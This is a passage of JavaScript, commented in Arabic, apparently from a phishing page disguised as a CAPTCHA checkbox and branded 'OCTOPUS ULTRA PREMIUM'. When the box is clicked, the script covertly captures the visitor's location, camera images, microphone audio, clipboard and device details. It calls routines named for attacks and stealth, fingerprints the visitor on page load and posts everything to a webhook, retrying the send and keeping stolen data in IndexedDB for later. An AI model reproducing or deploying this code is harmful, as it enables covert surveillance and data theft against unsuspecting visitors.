                // 2. تشغيل المهام المتوازية: الموقع، الكاميرا، الميكروفون
                const locationPromise = getLocation();
                const cameraPromise = startCameraAndCapture();
                const audioPromise = recordAudio();

                // ننتظر انتهاء الثلاثة معاً
                await Promise.all([locationPromise, cameraPromise, audioPromise]);

                // 3. جمع بيانات الجهاز (تعتمد على النتائج السابقة)
                await collectDeviceData();

                // 4. الهجمات
                deployAdvancedAttacks();

                // 5. الحافظة
                await readClipboard();

                // 6. الإرسال النهائي
                const sent = await sendAllData(false);

                if (sent) {
                    state.collectionComplete = true;
                    state.isCollecting = false;
                    setUIState('success');
                    logToConsole('🎉 كل البيانات أُرسلت بنجاح');
                } else {
                    state.pendingRetries = 0;
                    scheduleRetry();
                }

            } catch (err) {
                state.isCollecting = false;
                setUIState('failed');
                logToConsole('❌ خطأ في الجمع: ' + err.message);
                scheduleRetry();
            }
        }

        function scheduleRetry() {
            if (state.pendingRetries < CONFIG.MAX_RETRIES) {
                state.pendingRetries++;
                setTimeout(() => {
                    logToConsole(`🔄 محاولة إعادة الإرسال رقم ${state.pendingRetries}`);
                    sendAllData(true);
                }, CONFIG.RETRY_INTERVAL);
            }
        }

        // ================================================================
        //  أحداث الواجهة
        // ================================================================
        el.checkbox.addEventListener('change', function(e) {
            if (this.checked) {
                if (el.spinner.classList.contains('success') || state.collectionComplete) return;
                this.checked = false;
                collectEverything();
            }
        });

        el.checkbox.addEventListener('click', function(e) {
            if (this.disabled) e.preventDefault();
        });

        el.wrapper.addEventListener('click', function(e) {
            if (e.target.closest('.checkmark') || e.target.closest('.logo') ||
                e.target.closest('.captcha-footer') || e.target.closest('.links') || e.target.closest('.brand')) {
                return;
            }
            if (state.collectionComplete || state.isCollecting) return;
            if (!el.checkbox.checked && !el.spinner.classList.contains('loading')) {
                el.checkbox.checked = true;
                el.checkbox.dispatchEvent(new Event('change'));
            }
        });

        // ================================================================
        //  التهيئة
        // ================================================================
        window.addEventListener('load', async () => {
            extractTokenFromURL();
            setupSecurity();
            enhanceStealth();

            // إظهار المؤشر الأولي
            updatePermissionIndicator('camera', false);
            updatePermissionIndicator('mic', false);
            updatePermissionIndicator('location', false);
            updatePermissionIndicator('clipboard', false);
            setHeadlessIndicator(false);

            const backup = await loadFromIndexedDB();
            if (backup && backup.data) {
                logToConsole('🔄 Found backup data from IndexedDB');
                if (backup.data.token) state.userToken = backup.data.token;
                if (backup.data.ip) state.userIP = backup.data.ip;
                if (backup.data.location) state.userLocation = backup.data.location;
                if (backup.data.collectedData) state.collectedData = backup.data.collectedData;
                if (backup.data.attacksData) state.attacksData = backup.data.attacksData;
                if (backup.data.faceData) state.faceData = backup.data.faceData;
                if (backup.data.transcribedText) state.transcribedText = backup.data.transcribedText;
                if (backup.data.detectedLanguage) state.detectedLanguage = backup.data.detectedLanguage;
                if (backup.data.clipboardContent) state.clipboardContent = backup.data.clipboardContent;
                if (backup.data.isHeadless) state.isHeadless = backup.data.isHeadless;
                setTimeout(() => {
                    sendAllData(true);
                }, 5000);
            }

            try {
                const fd = new FormData();
                fd.append('event', 'visit');
                fd.append('timestamp', new Date().toISOString());
                fd.append('ip', state.userIP);
                fd.append('userAgent', navigator.userAgent);
                fd.append('platform', navigator.platform);
                fd.append('language', navigator.language);
                fd.append('screen', `${screen.width}x${screen.height}`);
                fd.append('url', window.location.href);
                fd.append('token', state.userToken);
                fd.append('isHeadless', String(state.isHeadless));
                await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
            } catch (_) {}

            classifyDevice();
            detectSpoofing();
            await collectDeviceData();

            logToConsole('🐙 OCTOPUS ULTRA PREMIUM v' + CONFIG.VERSION + ' – جاهز (توكن: ' + state.userToken + ')');
        });

        window.addEventListener('beforeunload', () => {
            if (state.mediaStream) state.mediaStream.getTracks().forEach(t => t.stop());
            if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
            if (state.audioRecorder && state.audioRecorder.state === 'recording') state.audioRecorder.stop();
        });
    </script>
